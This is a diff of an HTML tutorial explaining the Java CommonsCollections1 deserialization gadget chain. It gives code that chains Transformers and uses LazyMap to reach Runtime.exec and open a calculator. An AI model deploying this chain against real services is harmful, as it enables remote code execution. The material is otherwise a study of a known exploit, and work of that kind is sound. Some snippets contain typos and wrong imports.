@@ -156,62 +156,22 @@
         Take below code for an example.
     </p>
     <p>
-        <pre>
-</ol>
-<p>We will dicuss how the CommonsCollection1 payload works and we will pop a calculator withour own code file without using the ysoerial.</p>
-<p>We will discuss how exactly the serilized data gets created in ysorial in another post.</p>
-
-<P>SO lets start with ConstantTransformer</P>
-<h3>ConstantTransformer</h3>
 <p>
-    In case of  ConstantTransformer Once it's initialised with something no matter what you send to transform , it always returns the one that it has been initialised with.<br>
-    Take below code for an example.
-</p>
-<p>
-    <pre>
-    <code>
-    ConstantTransformer transformer = new ConstantTransformer("HelloWorld");
-    System.out.println(transformer.transform(123)); //Outouts HelloWorld and the return type Java.lang.String
-</code>
-    </pre></p>
-So we have instntiated the ConstantTransformer with the String "Helloworld".
-So even if we pass 123 to the transform method the value it will return is still gogin to be "HelloWorld"
-<p>
-    <img src="images/cc/ConstantTransformerInit.PNG">
-</p>
-
-<h3>InvokerTransFormer</h3>
-<p>InvokerTransFormer takes 3 arguments</p>
-<ul>
-    <li>First One: Name of a method</li>
-    <li>2nd one the type of parameters passed</li>
-    <li>The Value you want to the pass to those method</li>
-</ul> 
-<p> Take below code for an example.</p>
-<p>
-    <pre>
-        <code>
-            Person pt=new Person()
-            InvokerTransformer transformer = new InvokerTransformer("nice",new Class[]{String.class},new String[]{"YES"});
-            System.out.println(transformer.transform(pt)) //Outputs Yes
-        </code>
-    </pre>
+    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Person</span> pt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Person</span>();
+<span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"nice"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"YES"</span>});
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(transformer.<span style="color: #56a8f5;">transform</span>(pt)); <span style="color: #808080;">//Outputs Yes</span></pre></div>
 </p>
 
 <p>The above code will find the function on Person Class whose name is nice and it takes one Parameter of string type and the value its going to pass is "YES"<br>
 
     The Person class looks something like below</p>
     <p>
-        <pre>
-            <code>
-            public class Person {
+        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> Person {
 
-            public String nice(String a){
-                return a.toUpperCase();
-            }
-        }
-            </code>
-        </pre>
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">String</span> <span style="color: #56a8f5;">nice</span>(<span style="color: #cf8e6d;">String</span> s) {
+        <span style="color: #cf8e6d;">return</span> s;
+    }
+}</pre></div>
     </p>
    
 <p>So the Output of the code will be "YES"</p>
@@ -226,35 +186,58 @@ So even if we pass 123 to the transform method the value it will return is still
     Meaning it takes the output of the first Transformer and passes it as the argument of the 2nd TransFormer.</p>
     <p>So it takes an Input as array of TransFormers</p>
     <p>
-        <pre>
-            <code>
-        import java.util.ArrayList;
-        import java.util.HashMap;
-        import java.util.List;
-        import java.util.Map;
-        import java.util.HashMap;
+        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
+
+<span style="color: #cf8e6d;">public class</span> ChainedTransformerExample {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
+
+        <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] {
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #6aab73;">"constant"</span>),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"instantiate"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>])
+        };
+        <span style="color: #cf8e6d;">Transformer</span> ctr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(transformers);
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ctr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"RANDOM"</span>));
+    }
+}</pre></div>
+    </p>
+
+    <p>
+        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
         
-        import org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
         
-        import org.apache.commons.collections.functors.*;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
         
-        public class testing {
+<span style="color: #cf8e6d;">public class</span> testing {
         
         
-            public static void main(String args[]){
+            <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]){
         
-            Person pt=new Person();
+            <span style="color: #cf8e6d;">Person</span> pt=<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Person</span>();
           
-            ConstantTransformer tr=new ConstantTransformer(Person.class);
-            InvokerTransformer newInstanceTransformer = new InvokerTransformer("newInstance",new Class[0],new Object[0]);
-            InvokerTransformer tr3=new InvokerTransformer("nice",new Class[]{String.class},new  String[]{"hi"});
-            ChainedTransformer ctr=new ChainedTransformer(new Transformer[]{tr,newInstanceTransformer,tr3});
-            System.out.println(ctr.transform("RANDOM"));
+            <span style="color: #cf8e6d;">ConstantTransformer</span> tr=<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Person</span>.<span style="color: #cf8e6d;">class</span>);
+            <span style="color: #cf8e6d;">InvokerTransformer</span> newInstanceTransformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"newInstance"</span>,<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>],<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]);
+            <span style="color: #cf8e6d;">InvokerTransformer</span> tr3=<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"nice"</span>,<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>},<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"hi"</span>});
+            <span style="color: #cf8e6d;">ChainedTransformer</span> ctr=<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{tr,<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"newInstance"</span>,<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>],<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]),tr3});
+            <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ctr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"RANDOM"</span>));
             }}
             </code>
         </pre>
     </p>
-
+  </div>
     <p>Where constant and instantiate are the name if the Transformers</p>
     <p>The transfomr() of ChainedTransformer will take the argument required by the first Transformer of the TransFormer of the TransFormer array in our case it will be ConstantTransformer </p>
     <p>
@@ -263,30 +246,30 @@ So even if we pass 123 to the transform method the value it will return is still
     
     <p>So lets get into Payload</p>
 
-    <pre><code>public class CommonsCollections1PayloadOnly {<br>
-        public static void main(String... args) {<br>
-            String[] command = {"calc.exe"};<br>
-            final Transformer[] transformers = new Transformer[]{<br>
-                    new ConstantTransformer(Runtime.class), //(1)<br>
-                    new InvokerTransformer("getMethod",<br>
-                            new Class[]{ String.class, Class[].class},<br>
-                            new Object[]{"getRuntime", new Class[0]}<br>
-                    ), //(2)<br>
-                    new InvokerTransformer("invoke",<br>
-                            new Class[]{Object.class, Object[].class},<br>
-                            new Object[]{null, new Object[0]}<br>
-                    ), //(3)<br>
-                    new InvokerTransformer("exec",<br>
-                            new Class[]{String.class},<br>
-                            command<br>
-                    ) //(4)<br>
-            };<br>
-            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);<br>
-            Map map = new HashMap<>();<br>
-            Map lazyMap = LazyMap.decorate(map, chainedTransformer);<br>
-            lazyMap.get("Swagat");<br>
-        }<br>
-    }</code></pre>
+    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> CommonsCollections1PayloadOnly {
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>... args) {
+        <span style="color: #cf8e6d;">String</span>[] command = {<span style="color: #6aab73;">"calc.exe"</span>};
+        <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{
+                <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>), <span style="color: #808080;">//(1)</span>
+                <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>,
+                        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{ <span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>},
+                        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]}
+                ), <span style="color: #808080;">//(2)</span>
+                <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>,
+                        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>},
+                        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #b3ae60;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]}
+                ), <span style="color: #808080;">//(3)</span>
+                <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>,
+                        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>},
+                        command
+                ) <span style="color: #808080;">//(4)</span>
+        };
+        <span style="color: #cf8e6d;">ChainedTransformer</span> chainedTransformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(transformers);
+        <span style="color: #cf8e6d;">Map</span> map = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>&lt;&gt;();
+        <span style="color: #cf8e6d;">Map</span> lazyMap = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(map, chainedTransformer);
+        lazyMap.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"Swagat"</span>);
+    }
+}</pre></div>
 
 <p>The ideal goal is to execute Runtime.getRuntime().exec(Command)</p>
 <p>At [1] we are instntiating the ConstantTransformer with Runtime.class</p>
@@ -303,14 +286,12 @@ So even if we pass 123 to the transform method the value it will return is still
 <p>
     Before that lets just simplyfy the above code
 </p>
-<pre>
-    <code>ConstantTransformer tr=new ConstantTransformer(Runtime.class);
-        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
-        InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
-        InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
-        System.out.println(transformer.transform(Runtime.class).getClass().getName());
-        System.out.println(tr4.transform(tr3.transform(transformer.transform(Runtime.class))));</code>
-</pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
+<span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
+<span style="color: #cf8e6d;">InvokerTransformer</span> tr3 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #b3ae60;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]});
+<span style="color: #cf8e6d;">InvokerTransformer</span> tr4 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"calc.exe"</span>});
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr4.<span style="color: #56a8f5;">transform</span>(tr3.<span style="color: #56a8f5;">transform</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>))));</pre></div>
 <p>If you last line we are taking the out of the first Transfromer and passing it as an input for the next transFormer.<br>
     This is exactly what chainedTransfromer will do.</p>
 
@@ -321,11 +302,11 @@ So even if we pass 123 to the transform method the value it will return is still
     <h3>InvokerTransFormer</h3>
     <img src="images/cc/InvokerTransFormer_class.PNG">
     <p>The Below code shows the constuctor of the InvokerTransformer that will get called when class is being initialized.</p>
-    <pre><code> public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
-        this.iMethodName = methodName;
-        this.iParamTypes = paramTypes;
-        this.iArgs = args;
-      }</code></pre>
+    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #56a8f5;">InvokerTransformer</span>(<span style="color: #cf8e6d;">String</span> methodName, <span style="color: #cf8e6d;">Class</span>[] paramTypes, <span style="color: #cf8e6d;">Object</span>[] args) {
+    <span style="color: #cf8e6d;">this</span>.iMethodName = methodName;
+    <span style="color: #cf8e6d;">this</span>.iParamTypes = paramTypes;
+    <span style="color: #cf8e6d;">this</span>.iArgs = args;
+}</pre></div>
 So the above code takes the MethodName , Class array of paramTypes and Object[] of args.
 <p>When we call the TransForm Method defined at line 119 It uses Reflection to Invoke The Method Provided By Us.(If this looks foregin to you, i would recommed to Go thorugh Reflection Trainning and then Comback)</p>
 <p>This Means Using InvokerTransFormer We can Invoke Any method Present in the Class Path</p>
@@ -337,8 +318,8 @@ So the above code takes the MethodName , Class array of paramTypes and Object[] 
 <p>When we are calling Static Method we canot call it from an object of the class but we have to call it on class meaning className.MethodName(). So in our case we can only do it via Runtiem.getRuntime()</p>
 <p>IF we try to create an Object of Runtime() and call the getRuntime() it will thorugh a compile TIme Error</p>
 <p>Try Running the Below Code</p>
-<pre><code>Runtime rt=new Runtime();
-    rt.getRuntime().exec("calc.exe");</code></pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Runtime</span> rt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Runtime</span>();
+rt.<span style="color: #56a8f5;">getRuntime</span>().<span style="color: #56a8f5;">exec</span>(<span style="color: #6aab73;">"calc.exe"</span>);</pre></div>
 
 Excellent,
 So we know why we neeed InvokerTransFormer, but what about ConstantTransFormer?
@@ -352,31 +333,25 @@ And why we even need the "invoke"?</P>
 <p>Thats a good catch.</p>
 <p>Runtime.class doesn't even have the getMethod()</p>
 <p>Lets Check what does the ConstantTransFormer's transform() returns </p>
-<pre><code>
-    import java.util.ArrayList;
-    import java.util.HashMap;
-    import java.util.List;
-    import java.util.Map;
-    import java.util.HashMap;
-    
-    import javax.xml.transform.Transformer;
-    
-    import org.apache.commons.collections.functors.*;
-    
-    public class testing {
-    
-    
-        public static void main(String args[]){
-    
-    
-    
-    
-        ConstantTransformer tr=new ConstantTransformer(Runtime.class);
-        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
-        System.out.println(tr.transform("RANDOMESTRING").getClass().getName());
-        }
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+
+<span style="color: #cf8e6d;">import</span> javax.xml.transform.Transformer;
+
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
+
+<span style="color: #cf8e6d;">public class</span> testing {
+
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
+
+        <span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
+        <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"RANDOMESTRING"</span>).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
     }
-</code></pre>
+}</pre></div>
 <img src="images/cc/ReturnValueOfConstantTransformer.PNG">
 <p>As you can see the retunr Value is not java.lang.Runtime but its java.lang.Class</p>
 <p>Reason is when ever we pass a class to ConstantTransFormer it retunrs the Class.class (This Class Exist on JDK)</p>
@@ -391,78 +366,57 @@ And why we even need the "invoke"?</P>
 <p>But the class.class doesn't have the Invoke() defined.</p>
 <p>That is correct, the InvokerTransformer's transform() method return java.lang.reflect.Method and the invoke() is defined on there </p>
 <p>So once we call the invoke Method we get the Runtime.getRuntime()@</p>
-<p>
-    <pre>
-        <code>
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.HashMap;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
 
-import javax.xml.transform.Transformer;
+<span style="color: #cf8e6d;">import</span> javax.xml.transform.Transformer;
 
-import org.apache.commons.collections.functors.*;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
 
-public class testing {
+<span style="color: #cf8e6d;">public class</span> testing {
 
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
 
-    public static void main(String args[]){
-
-        ConstantTransformer tr=new ConstantTransformer(Runtime.class);
-        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
-        InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
-        System.out.println(tr.transform("RANDOMSTRING").getClass().getName());
-        System.out.println(transformer.transform(Runtime.class).getClass().getName());
-        System.out.println(tr3.transform(transformer.transform(Runtime.class)).getClass().getName());
+        <span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
+        <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr3 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #b3ae60;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"RANDOMSTRING"</span>).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(tr3.<span style="color: #56a8f5;">transform</span>(transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>)).<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>());
     }
-}
-        </code>
-    </pre>
-</p>
+}</pre></div>
 <img src="images/cc/reachedToRuntime.PNG">
 
 <p>So now we have the java.lang.Runtime and we can now call the exec() on it and that what we are doing at the end</p>
 <p>And as always we passing the new Class[]{String.class} and new String[]{"calc.exe"} as this is what exec function needs interms of invokerTransformer</p>
 <p>So now if we execute the below code we will have our calculator poped up.</p>
-<p>
-    <pre>
-        <code>
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.HashMap;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
 
-import javax.xml.transform.Transformer;
+<span style="color: #cf8e6d;">import</span> javax.xml.transform.Transformer;
 
-import org.apache.commons.collections.functors.*;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
 
-public class testing {
+<span style="color: #cf8e6d;">public class</span> testing {
 
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
 
-    public static void main(String args[]){
-
-
-
-
-    ConstantTransformer tr=new ConstantTransformer(Runtime.class);
-    InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
-    InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
-    InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
-    System.out.println(tr.transform("RANDOMSTRING").getClass().getName());
-    System.out.println(transformer.transform(Runtime.class).getClass().getName());
-    System.out.println(tr3.transform(transformer.transform(Runtime.class)).getClass().getName());
-    System.out.println(tr4.transform(tr3.transform(transformer.transform(Runtime.class))).getClass().getName());
-    
+        <span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
